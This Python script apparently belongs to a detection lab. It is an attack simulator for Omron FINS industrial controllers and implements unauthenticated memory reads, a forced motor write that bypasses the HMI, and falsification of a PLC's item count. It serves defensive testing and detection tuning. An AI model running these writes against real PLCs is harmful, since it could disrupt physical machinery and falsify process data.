"""FINS ICS attack simulator — triggers detection for Omron FINS, which has
no authentication in this implementation (matching real-world FINS
deployments, which have none by default), so every technique below is just a
normal protocol function aimed at someone else's PLC.

Malcolm's ACID package only has detection tables for S7comm/CIP/BACnet (see
reference_ot_ics_acid_triggers memory) — FINS gets no free ACID technique
tags here, same gap as Modbus/DNP3/OPC-UA. FINS has its own custom
OpenSearch Alerting monitor + "FINS Detection Overview" dashboard instead
(linux/configure_fins_alerting), same pattern as Modbus/S7comm/BACnet/
EtherNet-IP/DNP3 — verified live 2026-07-05.

Wire protocol is hand-rolled (fins_protocol.py/fins_logic.py, copied
unchanged from ansible/roles/ot/tasks/files/fins/ alongside this script) —
VERIFIED against a real Zeek capture 2026-07-05 (see fins_protocol.py's
module docstring): an isolated `zeek -C -r` replay parsed it perfectly on
the first try, no fix needed (unlike DNP3's header-CRC bug).

Each technique below runs in its own separate TCP connection (each doing its
own FINS/TCP node-address handshake) — same isolation rationale as
s7comm_attack.py/bacnet_attack.py/dnp3_attack.py.

Three techniques, mapped to MITRE ATT&CK for ICS:
  T0846 Remote System Discovery — unauthenticated MEMORY AREA READ of the
    item count (DM0) and motor state (CIO 0.00), no creds needed.
  T0855 Unauthorized Command Message — directly writing the motor bit
    (CIO 0.00), bypassing the HMI's own control entirely.
  T0836 Modify Parameter — falsifying the item count (DM0) directly via
    MEMORY AREA WRITE — the conveyor's actual run state is untouched, only
    the reported count lies.

Usage:
    python3 fins_attack.py --target 192.168.70.10
"""

from __future__ import annotations

import argparse
import logging
import socket
import struct

from fins_logic import CIO_MOTOR_ADDRESS, DM_ITEM_COUNT_ADDRESS, MEMORY_AREA_CIO_BIT, MEMORY_AREA_DM_WORD
from fins_protocol import (
    CMD_MEMORY_AREA_READ,
    CMD_MEMORY_AREA_WRITE,
    TCP_CMD_CLIENT_NODE_ADDR,
    TCP_CMD_FRAME,
    build_client_node_request,
    build_command_frame,
    build_fins_header,
    build_memory_area_read_data,
    build_memory_area_write_data,
    parse_read_response_data,
    parse_server_node_response,
    recv_tcp_frame,
    wrap_tcp_frame,
)

log = logging.getLogger("fins_attack")

ATTACKER_NODE = 99


def _handshake(sock: socket.socket) -> int:
    sock.sendall(wrap_tcp_frame(TCP_CMD_CLIENT_NODE_ADDR, build_client_node_request(ATTACKER_NODE)))
    _command, _error_code, payload = recv_tcp_frame(sock)
    _client_node, server_node = parse_server_node_response(payload)
    return server_node


def _send_command(sock: socket.socket, server_node: int, command_code: int, data: bytes) -> bytes:
    header = build_fins_header(is_response=False, dna=0, da1=server_node, da2=0, sna=0, sa1=ATTACKER_NODE, sa2=0, sid=1)
    frame = header + build_command_frame(command_code, data)
    sock.sendall(wrap_tcp_frame(TCP_CMD_FRAME, frame))
    _command, _error_code, resp_payload = recv_tcp_frame(sock)
    return resp_payload[12:]


def recon(host: str, port: int) -> None:
    log.info("[T0846 Remote System Discovery] unauthenticated MEMORY AREA READ of item_count + motor")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        server_node = _handshake(sock)

        req = build_memory_area_read_data(MEMORY_AREA_DM_WORD, DM_ITEM_COUNT_ADDRESS, 0, 1)
        resp_data = _send_command(sock, server_node, CMD_MEMORY_AREA_READ, req)
        _end_code, values = parse_read_response_data(resp_data)
        item_count = struct.unpack(">H", values[0:2])[0]

        req2 = build_memory_area_read_data(MEMORY_AREA_CIO_BIT, CIO_MOTOR_ADDRESS, 0, 1)
        resp_data2 = _send_command(sock, server_node, CMD_MEMORY_AREA_READ, req2)
        _end_code2, values2 = parse_read_response_data(resp_data2)
        motor_running = bool(values2[0])

        log.info("item_count=%d motor_running=%s (no credentials required)", item_count, motor_running)
    except Exception as exc:
        log.error("recon FAILED — %s", exc)
    finally:
        sock.close()


def force_motor(host: str, port: int, on: bool = True) -> None:
    log.info("[T0855 Unauthorized Command Message] forcing motor=%s directly, bypassing the HMI entirely", on)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        server_node = _handshake(sock)
        req = build_memory_area_write_data(MEMORY_AREA_CIO_BIT, CIO_MOTOR_ADDRESS, 0, 1, bytes([1 if on else 0]))
        _send_command(sock, server_node, CMD_MEMORY_AREA_WRITE, req)
        log.info("write accepted -- motor is now %s regardless of what the HMI commanded", on)
    except Exception as exc:
        log.error("force-motor FAILED — %s", exc)
    finally:
        sock.close()


def tamper_count(host: str, port: int, fake_count: int = 9999) -> None:
    log.info("[T0836 Modify Parameter] falsifying item_count=%d directly, run state untouched", fake_count)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5.0)
    try:
        sock.connect((host, port))
        server_node = _handshake(sock)
        req = build_memory_area_write_data(MEMORY_AREA_DM_WORD, DM_ITEM_COUNT_ADDRESS, 0, 1, struct.pack(">H", fake_count))
        _send_command(sock, server_node, CMD_MEMORY_AREA_WRITE, req)
        log.info("item_count forced to %d -- only the reported count lies, motor state is untouched", fake_count)
    except Exception as exc:
        log.error("tamper-count FAILED — %s", exc)
    finally:
        sock.close()


def attack(host: str, port: int) -> None:
    recon(host, port)
    force_motor(host, port, True)
    tamper_count(host, port, 9999)
    log.info("Attack sequence complete.")


def main() -> None:
    parser = argparse.ArgumentParser(description="FINS ACID/ATT&CK ICS attack simulator")
    parser.add_argument("--target", required=True, help="FINS PLC IP (e.g. 192.168.70.10)")
    parser.add_argument("--port", type=int, default=9600)
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    attack(args.target, args.port)


if __name__ == "__main__":
    main()
